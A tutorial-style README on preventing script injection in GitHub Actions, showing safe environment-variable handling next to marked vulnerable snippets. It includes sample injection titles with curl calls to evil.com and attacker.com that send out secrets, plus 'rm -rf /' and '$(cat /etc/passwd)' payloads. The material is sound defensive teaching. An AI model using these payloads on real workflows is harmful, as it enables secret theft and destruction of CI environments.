# GitHub Actions: Script Injection Prevention

## Overview

This project demonstrates critical security best practices for preventing script injection vulnerabilities in GitHub Actions workflows. Script injection is one of the most serious security risks in CI/CD pipelines, where malicious actors can inject arbitrary code through user-controlled inputs like issue titles, PR descriptions, or commit messages. This example shows the **secure** way to handle untrusted input by using environment variables instead of direct string interpolation.

## GitHub Actions Concepts

### Script Injection Vulnerability

Script injection occurs when user-controlled data is directly interpolated into shell commands, allowing attackers to execute arbitrary code. This is particularly dangerous in GitHub Actions because:

- **Public repositories**: Anyone can create issues or PRs
- **Workflow execution**: Malicious code runs in your CI/CD environment
- **Secret access**: Compromised workflows can access secrets
- **Repository access**: Attackers may gain write access to your repository

### Key Concepts Demonstrated

- **Environment Variables**: The secure way to handle untrusted input
- **Expression Interpolation**: Why direct interpolation is dangerous
- **Input Sanitization**: Proper handling of user-provided data
- **Context Access**: Understanding GitHub event context
- **Security Boundaries**: Separating code from data

## Prerequisites

- GitHub repository with Actions enabled
- Understanding of shell script security
- Familiarity with GitHub Actions context
- Knowledge of security best practices
- Awareness of injection attack vectors

## Project Structure

```
script-injection/
├── script-injection.yml          # Secure script injection prevention example
└── README.md                     # This documentation
```

## Workflow Files

### Secure Script Injection Prevention

**File**: `script-injection.yml`

This workflow demonstrates the **SECURE** approach to handling untrusted input.

```yaml
name: Label Issues (Script Injection Example)
on:
  issues:
    types:
      - opened
jobs:
  assign-label:
    runs-on: ubuntu-latest
    steps:
      - name: Assign label
        env:
          TITLE: ${{ github.event.issue.title }}
        run: |
          if [[ "$TITLE" == *"bug"* ]]; then
          echo "Issue is about a bug!"
          else
          echo "Issue is not about a bug"
          fi
```

### Why This Is Secure

The key security feature is using an environment variable:

```yaml
env:
  TITLE: ${{ github.event.issue.title }}
```

**Security Benefits**:
1. **Data Isolation**: The value is stored in an environment variable, not interpolated into code
2. **No Code Execution**: The shell treats `$TITLE` as data, not executable code
3. **Safe Comparison**: String comparison happens safely within the shell's variable context
4. **Injection Prevention**: Malicious characters in the title cannot break out of the variable

## Security Analysis

### Vulnerable Approach (DO NOT USE)

**DANGEROUS - DO NOT COPY THIS CODE**:

```yaml
# VULNERABLE CODE - DO NOT USE
steps:
  - name: Unsafe approach
    run: |
      if [[ "${{ github.event.issue.title }}" == *"bug"* ]]; then
        echo "Issue is about a bug!"
      fi
```

### Why This Is Vulnerable

When an attacker creates an issue with a malicious title:

```
Issue title: test"; curl http://evil.com?secret=$SECRET; echo "
```

The workflow would expand to:

```bash
if [[ "test"; curl http://evil.com?secret=$SECRET; echo "" == *"bug"* ]]; then
  echo "Issue is about a bug!"
fi
```

This executes the injected commands:
1. Breaks out of the string with `"`
2. Ends the statement with `;`
3. Executes arbitrary commands (`curl`)
4. Can exfiltrate secrets or compromise the workflow

### Secure Approach (USE THIS)

**SECURE CODE**:

```yaml
# SECURE - Use environment variables
steps:
  - name: Safe approach
    env:
      TITLE: ${{ github.event.issue.title }}
    run: |
      if [[ "$TITLE" == *"bug"* ]]; then
        echo "Issue is about a bug!"
      fi
```

**Why This Is Secure**:

Even with a malicious title:
```
Issue title: test"; curl http://evil.com; echo "
```

The environment variable `TITLE` contains the entire string as data:
```bash
TITLE='test"; curl http://evil.com; echo "'
if [[ "$TITLE" == *"bug"* ]]; then
  echo "Issue is not about a bug"
fi
```

The malicious characters are treated as literal string content, not executable code.

## Usage

### Secure Pattern for Untrusted Input

Always use environment variables for any user-controlled data:

```yaml
- name: Process user input safely
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
    ISSUE_BODY: ${{ github.event.issue.body }}
    PR_TITLE: ${{ github.event.pull_request.title }}
    COMMENT_BODY: ${{ github.event.comment.body }}
    COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
  run: |
    echo "Title: $ISSUE_TITLE"
    echo "Body: $ISSUE_BODY"
    # Process safely
```

### Secure Conditional Logic

Use environment variables in all conditional statements:

```yaml
- name: Check for keywords
  env:
    TITLE: ${{ github.event.issue.title }}
  run: |
    if [[ "$TITLE" == *"bug"* ]]; then
      echo "Bug detected"
    elif [[ "$TITLE" == *"feature"* ]]; then
      echo "Feature request detected"
    else
      echo "General issue"
    fi
```

### Secure String Processing

Safe string manipulation with environment variables:

```yaml
- name: Process title safely
  env:
    TITLE: ${{ github.event.issue.title }}
  run: |
    # Convert to lowercase
    LOWER_TITLE=$(echo "$TITLE" | tr '[:upper:]' '[:lower:]')

    # Extract first word
    FIRST_WORD=$(echo "$TITLE" | awk '{print $1}')

    # Count characters
    LENGTH=${#TITLE}

    echo "Lowercase: $LOWER_TITLE"
    echo "First word: $FIRST_WORD"
    echo "Length: $LENGTH"
```

### Secure API Calls

When using user input in API calls:

```yaml
- name: Create comment safely
  env:
    ISSUE_NUMBER: ${{ github.event.issue.number }}
    USER_NAME: ${{ github.event.issue.user.login }}
  run: |
    # Create JSON payload safely using jq
    PAYLOAD=$(jq -n \
      --arg user "$USER_NAME" \
      '{"body": "Thank you @\($user) for reporting this issue!"}')

    curl -X POST \
      --url "https://api.github.com/repos/${{ github.repository }}/issues/$ISSUE_NUMBER/comments" \
      -H 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
      -H 'content-type: application/json' \
      -d "$PAYLOAD" \
      --fail
```

### Secure File Operations

Safely work with files using user input:

```yaml
- name: Create file safely
  env:
    TITLE: ${{ github.event.issue.title }}
    BODY: ${{ github.event.issue.body }}
  run: |
    # Use environment variables to write to file
    echo "Title: $TITLE" > issue.txt
    echo "Body: $BODY" >> issue.txt

    # Process file safely
    cat issue.txt
```

### Secure Script Parameters

Pass user input as script parameters:

```yaml
- name: Run script with user input
  env:
    TITLE: ${{ github.event.issue.title }}
  run: |
    # Create a separate script
    cat > process.sh <<'EOF'
    #!/bin/bash
    # Script receives input as parameter
    TITLE="$1"
    if [[ "$TITLE" == *"bug"* ]]; then
      echo "Bug detected: $TITLE"
    fi
    EOF

    chmod +x process.sh
    ./process.sh "$TITLE"
```

## Attack Vectors and Prevention

### Attack Vector 1: Command Injection

**Attack**:
```
Issue title: test"; rm -rf /; echo "
```

**Vulnerable**:
```yaml
run: echo "Title is: ${{ github.event.issue.title }}"
# Expands to: echo "Title is: test"; rm -rf /; echo ""
```

**Secure**:
```yaml
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "Title is: $TITLE"
```

### Attack Vector 2: Secret Exfiltration

**Attack**:
```
Issue title: x"; curl http://attacker.com?data=$SECRET; echo "x
```

**Vulnerable**:
```yaml
env:
  SECRET: ${{ secrets.MY_SECRET }}
run: |
  if [[ "${{ github.event.issue.title }}" == "bug" ]]; then
    echo "Bug reported"
  fi
# Can exfiltrate $SECRET
```

**Secure**:
```yaml
env:
  SECRET: ${{ secrets.MY_SECRET }}
  TITLE: ${{ github.event.issue.title }}
run: |
  if [[ "$TITLE" == "bug" ]]; then
    echo "Bug reported"
  fi
# $SECRET is safe
```

### Attack Vector 3: Variable Substitution

**Attack**:
```
Issue title: $SECRET or $(cat /etc/passwd)
```

**Vulnerable**:
```yaml
run: echo "Issue: ${{ github.event.issue.title }}"
# May expand variables or execute commands
```

**Secure**:
```yaml
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "Issue: $TITLE"
# Treated as literal text
```

### Attack Vector 4: Multi-line Injection

**Attack**:
```
Issue title:
line1
line2"; malicious_command; echo "
line3
```

**Vulnerable**:
```yaml
run: |
  TITLE="${{ github.event.issue.title }}"
  echo "$TITLE"
```

**Secure**:
```yaml
env:
  TITLE: ${{ github.event.issue.title }}
run: |
  echo "$TITLE"
```

## Key Features

### Environment Variable Protection

Environment variables provide a security boundary:

```yaml
env:
  # User-controlled inputs - ALWAYS use env vars
  ISSUE_TITLE: ${{ github.event.issue.title }}
  ISSUE_BODY: ${{ github.event.issue.body }}
  PR_TITLE: ${{ github.event.pull_request.title }}
  PR_BODY: ${{ github.event.pull_request.body }}
  COMMENT: ${{ github.event.comment.body }}
  COMMIT_MSG: ${{ github.event.head_commit.message }}
  USERNAME: ${{ github.event.sender.login }}
  BRANCH_NAME: ${{ github.head_ref }}

  # Safe GitHub context values
  REPO: ${{ github.repository }}
  ACTOR: ${{ github.actor }}
```

### Proper Quoting

Always quote variables in shell:

```bash
# Good - quoted variable
if [[ "$TITLE" == *"bug"* ]]; then
  echo "Bug found"
fi

# Bad - unquoted variable
if [[ $TITLE == *bug* ]]; then
  echo "Bug found"
fi
```

### Using jq for JSON

Safely create JSON payloads with `jq`:

```yaml
- name: Create JSON safely
  env:
    TITLE: ${{ github.event.issue.title }}
    BODY: ${{ github.event.issue.body }}
  run: |
    # Use jq to safely encode JSON
    JSON=$(jq -n \
      --arg title "$TITLE" \
      --arg body "$BODY" \
      '{title: $title, body: $body}')

    echo "$JSON"
```

### Input Validation

Validate and sanitize input when necessary:

```yaml
- name: Validate input
  env:
    TITLE: ${{ github.event.issue.title }}
  run: |
    # Validate title length
    if [ ${#TITLE} -gt 200 ]; then
      echo "Title too long"
      exit 1
    fi

    # Validate allowed characters (example)
    if [[ ! "$TITLE" =~ ^[a-zA-Z0-9\ \.\-\_\:]+$ ]]; then
      echo "Title contains invalid characters"
      # Decide whether to fail or sanitize
    fi
```

## Troubleshooting

### Variable Not Expanding

**Issue**: Environment variable shows literal `$VARIABLE` instead of value

**Solution**:
- Ensure variable is set in `env:` block
- Check variable name matches exactly
- Verify shell interpolation is enabled

```yaml
env:
  MY_VAR: ${{ github.event.issue.title }}
run: |
  echo "$MY_VAR"  # Correct - will expand
  echo '$MY_VAR'  # Wrong - single quotes prevent expansion
```

### Multi-line Values

**Issue**: Multi-line input causes syntax errors

**Solution**:
- Environment variables handle multi-line correctly
- Quote variables in shell scripts
- Use heredoc for complex text

```yaml
env:
  BODY: ${{ github.event.issue.body }}
run: |
  # Multi-line body is safely stored in $BODY
  cat > body.txt <<EOF
$BODY
EOF
```

### Special Characters

**Issue**: Special characters in input cause issues

**Solution**:
- Environment variables handle special chars safely
- Use proper quoting
- Consider additional sanitization if needed

```yaml
env:
  TITLE: ${{ github.event.issue.title }}
run: |
  # Safe even with special characters: & | ; $ ` \ " ' < >
  echo "Title: $TITLE"
```

### Testing Security

**Issue**: Need to verify security measures work

**Solution**:
- Create test issues with malicious titles
- Monitor workflow execution
- Check for unexpected behavior

Test payloads:
```
test"; echo "INJECTED"; echo "
test$(whoami)test
test`whoami`test
test$SECRET
test; curl http://evil.com;
```

## Best Practices

### Always Use Environment Variables

For ANY user-controlled input:

```yaml
# SECURE
- name: Safe handling
  env:
    USER_INPUT: ${{ github.event.issue.title }}
  run: echo "$USER_INPUT"

# VULNERABLE
- name: Unsafe handling
  run: echo "${{ github.event.issue.title }}"
```

### Trust No User Input

Assume all user-provided data is malicious:

- Issue titles and bodies
- Pull request titles and descriptions
- Commit messages
- Comments
- Branch names
- Tag names
- Usernames (in some contexts)

### Minimize Secret Exposure

Limit secret access and exposure:

```yaml
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      # Process user input WITHOUT secrets
      - name: Process input
        env:
          TITLE: ${{ github.event.issue.title }}
        run: |
          echo "Processing: $TITLE"

  deploy:
    needs: process
    runs-on: ubuntu-latest
    steps:
      # Only use secrets in isolated job
      - name: Deploy
        env:
          SECRET: ${{ secrets.DEPLOY_SECRET }}
        run: |
          # No user input here
          ./deploy.sh
```

### Code Review Security

When reviewing workflows, check for:

1. **Direct interpolation of user input**
   ```yaml
   # Bad
   run: echo "${{ github.event.issue.title }}"
   ```

2. **Missing environment variables**
   ```yaml
   # Bad
   run: |
     TITLE="${{ github.event.issue.title }}"
   ```

3. **Unquoted variables**
   ```yaml
   # Bad
   run: echo $TITLE
   ```

4. **Eval or source with user input**
   ```yaml
   # Bad
   run: eval "${{ github.event.issue.title }}"
   ```

### Use Actions for Complex Logic

For complex operations, use TypeScript/JavaScript actions:

```typescript
// Secure action using @actions/core
import * as core from '@actions/core';
import * as github from '@actions/github';

async function run() {
  const title = github.context.payload.issue?.title || '';

  // Title is safely handled as a JavaScript string
  if (title.includes('bug')) {
    core.info('Bug detected');
  }
}

run();
```

### Audit Regularly

Regularly audit workflows for:
- User input handling
- Secret usage
- Permission scopes
- Third-party actions
- Deprecated patterns

### Defense in Depth

Layer security measures:

1. **Input validation**: Validate expected format
2. **Environment variables**: Isolate data from code
3. **Minimal permissions**: Limit what workflows can do
4. **Secret management**: Restrict secret access
5. **Monitoring**: Track workflow execution
